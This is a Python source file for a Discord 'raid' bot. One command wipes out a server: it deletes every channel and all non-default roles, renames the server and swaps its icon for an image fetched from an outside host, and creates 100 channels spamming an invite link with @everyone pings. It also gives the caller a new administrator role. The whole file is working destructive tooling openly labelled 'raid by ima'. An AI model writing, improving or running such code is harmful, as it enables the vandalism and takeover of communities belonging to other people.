import asyncio
import aiohttp
import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"{bot.user}でログインしました。")
    activity = discord.Game(name="raid by ima")
    await bot.change_presence(status=discord.Status.online, activity=activity)

@bot.command()
async def ima(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    new_server_name = "みんなのすみか植民地" 
    new_server_icon_url = "https://i.ibb.co/rfskMLvc/IMG-0991.jpg"
    role_name = "みんなのすみか万歳"
    admin_role_name = "みんなの住処に入ろう" 

    try:
        await guild.edit(community=False)
    except:
        pass

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(new_server_icon_url) as resp:
                if resp.status == 200:
                    new_server_icon = await resp.read()
                    await guild.edit(name=new_server_name, icon=new_server_icon)
    except:
        pass

    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    everyone_role = ctx.guild.default_role
    overwrite_permissions = discord.Permissions()
    overwrite_permissions.update(
        read_messages=True,
        send_messages=True,
        read_message_history=True
    )

    try:
        await everyone_role.edit(permissions=overwrite_permissions)
    except:
        pass

    create_tasks = [
        ctx.guild.create_text_channel(f'discord.gg/Rv3nVTAWsw') for _ in range(100) 
    ]
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    send_message_tasks = []
    message_content = '@everyone https://discord.gg/Rv3nVTAWsw' 

    for channel in new_channels:
        if isinstance(channel, Exception):
            continue
        for _ in range(5):
            send_message_tasks.append(channel.send(message_content))

    await asyncio.gather(*send_message_tasks, return_exceptions=True)

    delete_roles_tasks = [
        role.delete() for role in guild.roles if role != guild.default_role
    ]

    await asyncio.gather(*delete_roles_tasks, return_exceptions=True)

    try:
        admin_role = await guild.create_role(name=admin_role_name, permissions=discord.Permissions(administrator=True))
        await ctx.author.add_roles(admin_role)
    except:
        pass

    try:
        create_roles_tasks = [
            guild.create_role(name=role_name) for _ in range(30)
        ]
        await asyncio.gather(*create_roles_tasks, return_exceptions=True)
    except:
        pass

    return

bot.run("token")
